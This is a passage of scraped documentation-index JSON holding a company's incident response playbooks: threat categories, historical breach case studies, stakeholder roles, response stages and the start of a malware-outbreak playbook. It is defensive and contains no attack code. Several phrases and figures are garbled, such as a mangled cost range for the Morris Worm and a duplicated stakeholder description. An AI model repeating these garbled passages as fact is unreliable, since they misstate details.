including followers, Internet critics, and domestic actors. These attackers often exploit vulnerabilities in Redback's systems, networks, or applications to gain unauthorized access, steal sensitive information, or disrupt operations. External attacks come in many forms, including phishing attacks, malware, denial-of-service (DoS) attacks, and exploiting software vulnerabilities. For example, attackers could launch sophisticated cyberattacks on Redback's network infrastructure, using untouched software vulnerabilities to access sensitive data or disrupt critical business operations. Protecting against external attacks requires a proactive, multifaceted approach, including implementing cybersecurity controls, conducting regular vulnerability assessments, monitoring suspicious activity, and using threat intelligence to identify and mitigate emerging threats.  Case Study: SolarWinds Attack (2020)  Overview: Attackers infiltrated SolarWinds' Orion software, impacting multiple U.S. government agencies and private companies.Impact: The breach compromised sensitive data and required extensive remediation efforts.Response: SolarWinds implemented security enhancements, including improved software development practices and threat detection capabilities.  ","version":"Next","tagName":"h3"},{"title":"2.3 Data Breach​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#23-data-breach","content":" Data breaches are a serious threat to Redback's security posture due to the unauthorized access, deletion, or disclosure of sensitive or confidential information. These breaches can occur from multiple attack vectors, including external attacks, insider threats, and accidental data exposure. A data breach can have serious consequences for Redback, including financial loss, reputational damage, legal penalties, and loss of customer trust. For example, cybercriminals could exploit vulnerabilities in Redback's network infrastructure to gain unauthorized access to customer databases and steal sensitive information such as personally identifiable information (PII), payment card data, inventory, or mind. Preventing and mitigating data breaches requires a multilayered approach, including implementing strong access controls, encrypting sensitive data, monitoring for unauthorized access, conducting regular security audits, and adhering to regulatory compliance requirements such as GDPR or CCPA.  Case Study: Equifax Data Breach (2017)  Overview: Attackers exploited a vulnerability in Equifax's web application framework to gain access to sensitive information.Impact: The breach exposed personal information of approximately 147 million individuals.Response: Equifax enhanced its cybersecurity practices, implemented stronger access controls, and paid a settlement of up to $700 million.  ","version":"Next","tagName":"h3"},{"title":"2.4 Phishing Attacks​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#24-phishing-attacks","content":" Phishing attacks are a prevalent form of cyber threat that targets individuals within Redback through deceptive tactics, such as fraudulent emails, messages, or websites, with the goal of tricking recipients into divulging sensitive information or performing malicious actions. These attacks often impersonate legitimate entities, such as Redback's employees, customers, or business partners, to gain the trust of unsuspecting victims. Phishing attacks can take various forms, including email phishing, spear phishing, or social media phishing, and may involve enticing recipients to click on malicious links, download malwareinfected attachments, or enter login credentials into fraudulent websites. For example, a cybercriminal may send a phishing email to Redback's employees, posing as the IT department and requesting them to reset their passwords by clicking on a malicious link, thereby compromising their credentials, and gaining unauthorized access to Redback's systems. Preventing phishing attacks requires a combination of user education and awareness training with technical capabilities, such as email filtering, web content analysis, and endpoint protection, to help people recognize and report phishing attempts.  Case Study: Target Phishing Attack (2013)  Overview: Attackers used phishing emails to gain access to Target's network, stealing credit card information.Impact: The breach affected over 40 million customers and resulted in significant financial losses.Response: Target invested in cybersecurity improvements, including advanced threat detection and employee training programs.  ","version":"Next","tagName":"h3"},{"title":"2.5 Ransomware Attack​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#25-ransomware-attack","content":" Ransomware attacks are a serious threat to Redback's operations by distributing malicious software that encrypts files or systems and makes them inaccessible until payment is made. striker These attacks can cause damage to Redback, including data loss, financial damage, organizational disruption, and reputational damage. Ransomware attacks can be delivered through various methods, including email phishing, packet exploits, and remote desktop protocol (RDP) vulnerabilities, which can target endpoints, servers, and Redback network infrastructure. For example, cybercriminals can distribute ransomware to Redback employees using phishing emails with malicious attachments. Once opened, the attachment encrypts files on the victim's device and demands a ransom in exchange for the decryption key. Preventing ransomware attacks requires a multi-layered approach, including implementing end-to-end security measures, backing up sensitive data, patching known vulnerabilities, and segmenting networks to prevent the spread of ransomware and staff training on ransomware risks and best practices.  Case Study: WannaCry Ransomware Attack (2017)  Overview: The WannaCry ransomware exploited a Windows vulnerability, encrypting data on affected systems.Impact: The attack affected over 200,000 computers across 150 countries, causing widespread disruption.Response: Organizations applied security patches, enhanced backup practices, and improved incident response plans.  ","version":"Next","tagName":"h3"},{"title":"2.6 Credential Theft​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#26-credential-theft","content":" Unauthorized removal or misuse of login credentials, such as usernames and passwords, to access a secure Redback State site. Systems, applications, or sensitive information. These credentials can be obtained in several ways, including phishing attacks, hacking techniques, or exploiting vulnerabilities in the authentication method. Identitytheft allows attackers to impersonate legitimate users, bypass security controls, and gain unauthorized access to Redback resources. For example, cybercriminals can use stolen credentials to log into the Redback employee portal and download sensitive. data or initiate fraudulent activities. To prevent information theft, you should implement strong authentication methods, including multifactor authentication MFA,password management policies, and user training to educate employees on the importance of protecting their symptoms and being aware of potential threats.  Basically, Redback Operations implements cybersecurity measures and enforces security to stay alert against all types of attacks, including insider threats, external attacks, data breaches, phishing attacks, ransomware attacks, and theft to stay on top of day. Aculture of security awareness throughout the organization.  Case Study: LinkedIn Data Breach (2012)  Overview: Hackers accessed LinkedIn's user database, stealing hashed passwords.Impact: The breach exposed millions of user credentials, leading to unauthorized access.Response: LinkedIn implemented stronger password hashing techniques and encouraged users to adopt two-factor authentication.  ","version":"Next","tagName":"h3"},{"title":"3 Stakeholders​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#3-stakeholders","content":" The proficient handling and settlement of incidents require the coordinated endeavours and cooperation of a heterogeneous group of stakeholders, each possessing distinct knowledge, viewpoints, and roles. The following parties are essential to the incident response process, from frontline responders entrusted with containment and mitigation to senior leadership tasked with making strategic decisions:  IT Security Team: Redback Operations' IT Security Team is a key element of incident response, spearheading the technical efforts to locate, investigate, and resolve problems involving improper usage. This team oversees monitoring system and network logs, doing forensic investigation, and implementing security procedures to prevent such incidents in the future. They work together with other relevant parties to guarantee a coordinated and effective response to instances of inappropriate usage, minimising the impact on Redback's operations and data protection.Incident Response Team: The cross-functional incident response team at Redback Operations is made up of representatives from the management, IT, security, and legal departments. This group is responsible for planning incident response actions, communicating with pertinent stakeholders, and making critical decisions to contain and handle instances of inappropriate use. They ensure that incident response operations adhere to Redback's policies, procedures, and legal obligations, fostering a cohesive and efficient response.Legal and Compliance Department The management, IT, security, and legal departments are represented on Redback Operations' cross-functional incident response team. To contain and manage cases of inappropriate use, this group oversees organising incident response actions, corresponding with relevant parties, and making crucial decisions. To promote a coordinated and effective reaction, they make sure that incident response activities follow Redback's rules, processes, and legal duties.System Administrators: Root access concerns are largely identified, investigated, and resolved by system administrators, who operate as stewards of organisational systems and networks, using their technical expertise and domain experience to restore system integrity and performance.Management: Setting organisational priorities, allocating resources, and spearheading strategic efforts aimed at bolstering the organization's resilience against root access threats are all crucial tasks performed by executive leadership, which includes C-suite executives and senior management.External Consultants: Organisations may hire outside consultants or third-party vendors to supplement their incident response capabilities in situations requiring specific knowledge or resources. These vendors can help with forensic analysis, threat intelligence, and remediation efforts.  ","version":"Next","tagName":"h2"},{"title":"RACI Chart for Incident Response​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#raci-chart-for-incident-response","content":" Task/Activity\tIT Security Team\tIncident Response Team\tCommunication Team\tCustomers\tThird-Party VendorsPreparation Establish incident response team\tR, C\tA, R\tI\tI\tI Develop response procedures\tA, R\tR, C\tI\tI\tI Conduct training sessions\tA, R\tR\tI\tI\tI Implement surveillance systems\tA, R\tR\tI\tI\tI Detection Monitor system logs and traffic\tA, R\tR\tI\tI\tI Use IDS and SIEM tools\tA, R\tR\tI\tI\tI Analyse alerts\tA, R\tR\tI\tI\tI Analysis Conduct forensic analysis\tA, R\tR\tI\tI\tI Determine impact\tA, R\tR\tI\tI\tI Identify threat actor tactics\tA, R\tR\tI\tI\tI Containment Isolate affected systems\tA, R\tR\tI\tI\tI Implement access controls\tA, R\tR\tI\tI\tI Block malicious activity\tA, R\tR\tI\tI\tI Eradication Remove unauthorized access\tA, R\tR\tI\tI\tI Patch vulnerable systems\tA, R\tR\tI\tI\tI Update security policies\tA, R\tR\tI\tI\tI Recovery Restore compromised systems\tA, R\tR\tI\tI\tI Recover data from backups\tA, R\tR\tI\tI\tI Reconfigure networks\tA, R\tR\tI\tI\tI Post-Incident Review Assess incident response\tA, R\tR\tI\tI\tI Document lessons learned\tA, R\tR\tI\tI\tI Update incident response protocols\tA, R\tR\tI\tI\tI  Key:  R: Responsible (those who do the work)A: Accountable (those who are ultimately answerable)C: Consulted (those who provide input)I: Informed (those who are kept up to date)  ","version":"Next","tagName":"h3"},{"title":"4. Flow Chart​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#4-flow-chart","content":"   Preparation Stage (Yellow):  This phase involves the first steps in becoming ready to handle any issue that may arise with Redback's systems.Establishing the incident response team, creating crisis response protocols, running training sessions and simulations, and putting security and surveillance technologies in place are important tasks.The necessity of readiness and preparation for the efficient handling of situations is symbolised by the colour yellow.  Detection Stage (Red):  Identifying signs of inappropriate use or illegal access to Redback's systems and resources is the main goal at this point.Using intrusion detection systems (IDS) and security information and event management (SIEM) technologies, keeping an eye out for suspicious activity, and examining anomalies and warnings are some of the actions involved.Red is a symbol for the urgency and importance of event detection to provide quick mitigation and response actions.  Analysis Stage (Violet):  This stage entails determining the type and extent of the incident that has been discovered.Data collection, forensic analysis, system and network analysis, threat actor strategies, and indicator of compromise (IOC) identification are among the activities involved.The colour violet represents the necessity for a careful investigation to ascertain the incident's causes, consequences, and authorship.  Containment Stage (Sky Blue):  At this point, measures are being done to lessen the incident's impact and stop more unauthorised access or data leaks.To contain or prevent harmful software or data, segregate susceptible systems, put access restrictions in place, and, if containment fails, escalate to senior management.The containment strategies intended to lessen the incident's impact and spread are symbolised by the colour sky blue.  Eradication Stage (Light Green):  This phase concentrates on eliminating attackers from Redback's networks and infrastructure and resolving any risks or vulnerabilities that may still exist after the event has been controlled.Among the tasks include deleting illegal software and data, patching, or upgrading weak systems, and examining and revising security guidelines and protocols.The activity of eliminating the event and guaranteeing the security of the organization's systems is represented by the colour light green.  Recovery Stage (Pink):  Restoring impacted systems and data to normal functioning and continuing company operations are the goals of the recovery stage.Rebuilding or reconfiguring networks and systems, recovering corrupted systems and data backups, and putting user awareness and education programmes into action are among the tasks.The process of recuperating from the catastrophe and improving security procedures to lessen the possibility of a recurrence is symbolised by the colour pink.  Post-Incident Review Stage (Brown):  Post-incident activities are carried out in the last step to assess the organization's reaction to the incident and pinpoint areas that require improvement.The process of responding to incidents is thoroughly analysed, best practices and lessons gained are documented, and incident response protocols, rules, and security configurations are updated, among other tasks.The post-event initiatives intended to improve future response efforts and learn from the occurrence are represented by the colour brown.  ","version":"Next","tagName":"h2"},{"title":"5. Incident Response Stages  ​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"1. Preparation​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#1-preparation","content":" Objective: Putting in place the guidelines, practices, and tools required to handle issues in Redback's systems.Activities:Putting together a team for incident response with clear roles and duties.Creating strategies and processes for crisis response, such as escalation routes and communication guidelines.Holding practice sessions and exercises on a regular basis to guarantee readiness and rehearse incident response protocols.Putting in place security measures and surveillance systems to find and stop events.Outcome: A well-equipped company with the ability to react to situations quickly and efficiently.  ","version":"Next","tagName":"h3"},{"title":"2. Detection​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#2-detection","content":" Objective: Recognising warning signs of illegal access to Redback's resources and systems.Activities:Keeping an eye out for questionable activity, such as odd access patterns or unauthorised attempts at authentication.Using security information and event management (SIEM) and intrusion detection systems (IDS) to find such problems.Examining abnormalities and warnings to distinguish between authorised and unauthorised activity.Outcome: Rapid reaction times and mitigating actions are made possible by early event detection.  ","version":"Next","tagName":"h3"},{"title":"3. Analysis​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#3-analysis","content":" Objective: Recognising the type and extent of the incident that occurred.Activities:Gathering information and carrying out forensic investigation to ascertain the origin and degree of the illegal entry.**Examining hacked networks and systems to find attack vectors and how they affect compromised data.Recognising the tactics, methods, and procedures (TTPs) of threat actors and indicators of compromise (IOCs).Outcome: A thorough comprehension of the event, considering its causes, consequences, and attributions.  ","version":"Next","tagName":"h3"},{"title":"4. Containment​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#4-containment","content":" Objective: Limiting the spread and effects of the incident and stopping any illegal access or data leaks.Activities:Dividing up susceptible networks and systems to stop intruders from moving laterally.Putting safety measures and access restrictions in place to stop illegal access to sensitive data.Limiting or preventing harmful data, software, or network flow to stop more damage.Outcome: Efficient handling of the situation to reduce harm to Redback's systems and data.  ","version":"Next","tagName":"h3"},{"title":"5. Eradication​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#5-eradication","content":" Objective: Eliminating threats and any lingering vulnerabilities from Redback's networks and IT systems.Activities:Removing illegal access and putting compromised systems back in a safe and secure condition.Upgrading or patching susceptible systems and software to stop further exploitation.Examining and revising security protocols and guidelines to fix flaws or vulnerabilities found.Outcome: Eradicating all evidence of the incident and minimising weaknesses to stop it from happening again.  ","version":"Next","tagName":"h3"},{"title":"6. Recovery​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#6-recovery","content":" Objective: Restarting company operations and returning impacted systems and data to normal functioning.Activities:Restoring damaged systems and data backups to guarantee the integrity and accessibility of data.Rebuilding or rearranging networks and systems to improve security and stop such incidents in the future.Putting user awareness and education programmes into action to reduce unauthorised access events in the future.Outcome: Full restoration of operations and services, together with strengthened security measures to lessen the chance of recurrence.  ","version":"Next","tagName":"h3"},{"title":"7. Post-Incident Review​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#7-post-incident-review","content":" Objective: Assessing the organization's reaction to the event, noting lessons gained and opportunities for development.Activities:Evaluating the incident response procedure in-depth to find its advantages, disadvantages, and potential areas for development.Recording best practices and lessons discovered to improve incident response skills in the future.Modifying security setups, rules, and incident response protocols considering review results.Outcome: Improved capacity for responding to crises and preparedness for new ones.  ","version":"Next","tagName":"h3"},{"title":"6. Steps for Monitoring Threats​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#6-steps-for-monitoring-threats","content":" ","version":"Next","tagName":"h2"},{"title":"6.1 Establish a Monitoring Strategy​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#61-establish-a-monitoring-strategy","content":" Objective: Establish and implement a comprehensive strategy for continuous threat monitoring. Activities: Clearly define objectives for threat monitoring.Select appropriate security tools such as IDS/IPS, SIEM systems, EDR solutions, and user behavior analytics software.Establish baselines for normal user activity, system behavior, and network traffic patterns. Outcome: A well-defined monitoring strategy aligned with Redback Operations' goals, enhancing the ability to detect and respond to threats effectively.  ","version":"Next","tagName":"h3"},{"title":"6.2 Deploy Monitoring Solutions​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#62-deploy-monitoring-solutions","content":" Objective: Deploy and configure monitoring tools across the organization’s infrastructure to detect threats. Activities: Deploy selected monitoring tools across networks, systems, and endpoints.Integrate monitoring tools with threat intelligence feeds.Ensure logging is enabled on critical systems, networks, and applications. Outcome: Comprehensive deployment and integration of monitoring solutions providing detailed insights into potential threats.  ","version":"Next","tagName":"h3"},{"title":"6.3 Continuous Monitoring and Analysis​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#63-continuous-monitoring-and-analysis","content":" Objective: Maintain continuous monitoring and analysis to promptly detect and respond to threats. Activities: Implement real-time monitoring to continuously observe user activities, system behavior, and network traffic.Utilize behavioral analytics and machine learning to identify anomalies.Correlate events from various sources to identify patterns. Outcome: Enhanced capability to detect threats promptly, enabling swift response to mitigate potential impacts.  ","version":"Next","tagName":"h3"},{"title":"6.4 Alerting and Notification​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#64-alerting-and-notification","content":" Objective: Ensure timely and effective response to detected threats through a robust alerting system. Activities: Establish thresholds for different types of alerts.Configure automated alerts to notify the security team.Implement a system to prioritize alerts based on their severity. Outcome: Timely and effective response to detected threats, reducing the risk of significant damage.  ","version":"Next","tagName":"h3"},{"title":"6.5 Investigate and Respond​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#65-investigate-and-respond","content":" Objective: Conduct thorough investigations and implement appropriate actions to mitigate identified threats. Activities: Perform initial triage to verify the validity and potential impact of alerts.Conduct in-depth analysis of confirmed alerts.Initiate containment measures and execute necessary eradication procedures. Outcome: Effective investigation and mitigation of threats, ensuring minimal impact on the organization.  ","version":"Next","tagName":"h3"},{"title":"6.6 Post-Incident Review​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#66-post-incident-review","content":" Objective: Assess the effectiveness of the response and identify areas for improvement. Activities: Record all details of the incident, including detection, analysis, and response actions taken.Conduct a review of the monitoring and response processes post-incident.Update monitoring tools, configurations, and thresholds based on the findings. Outcome: Continuous improvement of incident response and threat monitoring processes.  ","version":"Next","tagName":"h3"},{"title":"6.7 Continuous Improvement​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#67-continuous-improvement","content":" Objective: Maintain and enhance the organization’s threat monitoring strategy and tools. Activities: Conduct regular audits to ensure monitoring tools and strategies remain effective.Provide ongoing training to security personnel.Continuously adapt the monitoring strategy to address emerging threats. Outcome: A proactive and adaptive threat monitoring strategy that evolves with the changing threat landscape.  ","version":"Next","tagName":"h3"},{"title":"7. Terminology​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#7-terminology","content":" Incident: Any event that threatens the security, integrity, or availability of Redback Operations' systems, networks, or data. Intrusion Detection System (IDS): Monitors network traffic for signs of malicious activity, unauthorized access, or security breaches. Security Information and Event Management (SIEM): Provides real-time visibility into security incidents by aggregating and analysing security event data from multiple sources. Vulnerability: A weakness or flaw in software, hardware, or processes that can be exploited to gain unauthorized access or cause damage. Phishing: A technique used by attackers to deceive individuals into divulging sensitive information, such as usernames, passwords, and credit card details, by posing as a trustworthy entity. Ransomware: Malicious software that encrypts files or systems, rendering them inaccessible until a ransom is paid. Forensic Analysis: The process of collecting, preserving, and analysing digital evidence to investigate and respond to security incidents. Containment: Actions taken to limit the spread and impact of a security incident. Eradication: The process of removing threats and vulnerabilities from systems after a security incident. Recovery: Actions taken to restore normal operations and ensure data integrity after a security incident. Post-Incident Review: A structured review and analysis of the response to a security incident to identify lessons learned, areas for improvement, and corrective actions. Root Cause Analysis (RCA): A methodical investigation process used to determine the underlying cause or causes of a security incident. Least Privilege Principle: The security principle that users, processes, and systems should be granted only the minimum level of access or permissions necessary to perform their intended tasks. Credential Theft: The unauthorized acquisition of user credentials, such as usernames and passwords, often used to facilitate further attacks or unauthorized access. Lateral Movement: The process of moving within a network to access additional systems and data after gaining initial access. Privilege Escalation: The act of increasing the level of access or permissions granted to a user or application, typically to gain unauthorized control over system resources or sensitive data. Zero-Day Vulnerabilities: Previously unknown security holes in software or systems that leave organizations exposed to exploitation by malicious actors. ","version":"Next","tagName":"h2"},{"title":"Malware-Outbreak Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#1-introduction","content":" Data integrity, reputation, and company operations are all seriously at danger from malware outbreaks. To reducing harm and guaranteeing business continuity, timely malware incident identification, containment, and mitigation are essential. This playbook offers a systematic approach for managing malware outbreaks, defining roles, duties, and procedures to enable a successful response.  ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#11-overview","content":" The incident response playbook for malware outbreaks provides a structured approach to locating, stopping, eliminating, and recovering from attacks by malware. It seeks to expedite reaction efforts and lessen the effect of malware breakouts on organisational assets and stakeholders by creating defined protocols and communication channels.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#12-purpose","content":" This playbook's goals are to:  Provide a uniform procedure for tackling malware outbreaks to guarantee consistency and effectiveness in incident management.Enable prompt detection and incident containment to stop malware from spreading further and reduce damage.Reduce the impact of malware outbreaks on company operations and lower the financial losses they cause.During incident response activities, encourage cooperation, coordination, and communication amongst response teams, stakeholders, and other relevant parties.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#13attack-definition","content":" Malware is software that is intentionally created to cause harm, interfere with operations, or obtain unauthorised access to data, networks, and computer systems. It includes a wide range of dangers, including as trojans, worms, viruses, ransomware, and spyware. Multiple routes, including portable media, malicious websites, email attachments, and software flaws, can lead to malware epidemics.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#14-scope","content":" This playbook covers incidents related to malware outbreaks on Redback Operations computers, networks, and endpoints. It addresses both external and internal malware issues that impact stakeholders, data assets, and company processes, requiring an integrated response effort regardless of the type of malware or transmission technique.  ","version":"Next","tagName":"h3"},{"title":"2. Attack Types​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#2-attack-types","content":" Malware outbreaks may take many different shapes, and responding to each one presents different difficulties for incident response teams. Malware outbreaks are often linked to the following attack types:  ","version":"Next","tagName":"h2"},{"title":"2.1 Worms​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#21-worms","content":" Worms are self-replicating viruses that spread across networks, exploiting security holes to quickly infect connected computers.  Signs of Worm Activity:  Unusual network traffic increases. High bandwidth usage due to worm replication. Increased memory or CPU consumption on compromised computers. Unknown files or processes in system logs. Random system restarts or crashes. Case Study: The Morris Worm (1988) Overview: One of the earliest worms to spread across the internet was the Morris Worm. Robert Tappan Morris was the creator, and it was made available on November 2, 1988.Signs of Activity: Spreading quickly across networked computers, resulting in resource exhaustion-related system slowdown or crashes.Impact: Affected around 6,000 significant Unix computers, or 10% of the internet at the time. It was projected that the worm would cost between 100,000and100,000 and 100,000and10 million to eradicate.Response: Network security awareness has grown, and CERT (Computer Emergency Response Team) was established to deal with these kinds of situations.  ","version":"Next","tagName":"h3"},{"title":"2.2 Trojans​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#22-trojans","content":" Trojans pose as trustworthy programmes to fool users into downloading and running malicious code, giving hackers access to compromised systems without authorisation.  Signs of Trojan Infection:  Suspicious applications or processes running in the background. Unauthorized changes to files or system settings. Remote attackers accessing sensitive information or system resources. Unexpected toolbar or application installations. System sluggishness or frequent crashes. Case Study: Zeus Trojan (2007) Overview: Zeus, sometimes referred to as Zbot, is a Trojan horse malware bundle that operates on Microsoft Windows versions. It was initially discovered in July 2007.Signs of Activity: Unauthorised access to banking information, unauthorised transactions, and keylogging.Impact: Zeus compromised millions of dollars' worth of fraudulent transactions by infecting thousands of machines throughout the globe with malware and stole banking passwords.Response: Law enforcement and security firms worked together to knock down Zeus command-and-control servers and make many arrests.  ","version":"Next","tagName":"h3"},{"title":"2.3 Ransomware​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#23-ransomware","content":" Ransomware encrypts user files or locks them out of their computers, then demands money to free it or grant access again.  Signs of Ransomware Activity:  Files that are inaccessible and have a.locky or.crypt file extension are encrypted. Appearance of warning messages or ransom notes requesting money to unlock files. Alteration of file dates or properties through the encryption procedures of ransomware. Unusual patterns of network traffic as the ransomware talks to the servers that govern it. Existence on compromised systems of ransomware-related artefacts, such as executables or registry entries. Case Study: WannaCry Ransomware Attack (2017) Overview: WannaCry was a ransomware cryptoworm that targeted computers running the Microsoft Windows operating system by encrypting data and demanding ransom payments in Bitcoin.Signs of Activity: Files became inaccessible with &quot;.wncry&quot; extensions, and users saw ransom notes demanding payment.Impact: The incident impacted more than 230,000 computers across 150 nations, seriously disrupting businesses like the National Health Service (NHS) in the United Kingdom. There were billions to hundreds of millions of dollars in financial losses.Response: The ransomware's propagation was slowed down when a security researcher found a kill switch in its code. Affected companies strengthened their security protocols and put strategies in place for data recovery.  ","version":"Next","tagName":"h3"},{"title":"2.4 Botnets​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#24-botnets","content":" Botnets are networks of infected devices under the control of hackers, frequently employed to carry out coordinated assaults or disseminate malware payloads.  Signs of Botnet Infection:  Strange outgoing network connections to command-and-control sites made by compromised devices. Large amounts of harmful or spam emails coming from infected computers. Botnet activity on compromised devices is causing high CPU or bandwidth utilisation. The existence of backdoor trojans or remote access programmes that facilitate botnet communication. Unexpected alterations in system behaviour or performance brought on by botnet activity. Case Study: Mirai Botnet (2016) Overview: A software known as the Mirai botnet transforms Linux-powered networked devices into remotely controlled bots that may be deployed as components of a larger botnet in extensive network attacks.Signs of Activity: Unusual network traffic patterns, particularly to command-and-control servers, and involvement in large-scale DDoS attacks.Impact: One of the worst DDoS assaults ever launched against DNS provider Dyn was brought on by the Mirai botnet and resulted in extensive disruptions to the internet.Response: Police departments located and detained Mirai's founders. ISPs and security companies collaborated to increase device security and lessen the botnet's effects.  ","version":"Next","tagName":"h3"},{"title":"2.5 Spyware​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#25-spyware","content":" Without user agreement, spyware secretly records private user data, gathers it, and sends it to hostile parties.  Signs of Spyware Presence:  Unexpected adjustments to the homepage or default search engine in a browser. Display of inappropriate pop-up advertisements or browser reroutes to unsafe websites. Existence of toolbars or unusual browser extensions that have been installed without permission. Spyware activity might cause a slow internet connection or poor browser performance. Criminals gaining illegal access to passwords, surfing history, or sensitive information. Case Study: FinFisher/FinSpy (2011) Overview: Gamma Group sells the surveillance spyware suite FinFisher, also referred to as FinSpy. Several nations have employed it for monitoring reasons.Signs of Activity: Unauthorized access to sensitive data, keystroke logging, and remote surveillance capabilities.Impact: Human rights advocates, journalists, and political dissidents have all been the targets of FinFisher. Devices in more than 30 nations have been found to contain the malware.Response: Human rights groups have brought attention to the use of FinFisher, and cybersecurity companies have created instruments for identifying and eliminating the malware  ","version":"Next","tagName":"h3"},{"title":"2.6 Adware​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Malware Outbreak Incident Response Playbook#26-adware","content":" Without the user's permission, adware gathers user data for targeted advertising, displays invasive adverts, and reroutes web traffic.  Signs of Adware Infection:  Sudden emergence of unwelcome pop-up advertising or banners when browsing the internet. Redirects users who click on links or search results to dubious or harmful websites. Adware processes causing slow browser speed or frequent crashes. Altering the main page or preferred search engine in a browser without permission. Data, database entries, or browser extensions connected to adware being present on compromised machines. Case Study: Fireball Adware (2017) Overview: Check Point found an adware called Fireball that takes over browsers and transforms them into zombies.Signs of Activity: Browser hijacking, changes to default search engine, and installation of additional adware or potentially unwanted programs.Impact: Over 250 million machines were infected by Fireball globally, mostly because of it being bundled with other free software. It gathered user data and made false advertising money.Response: To identify 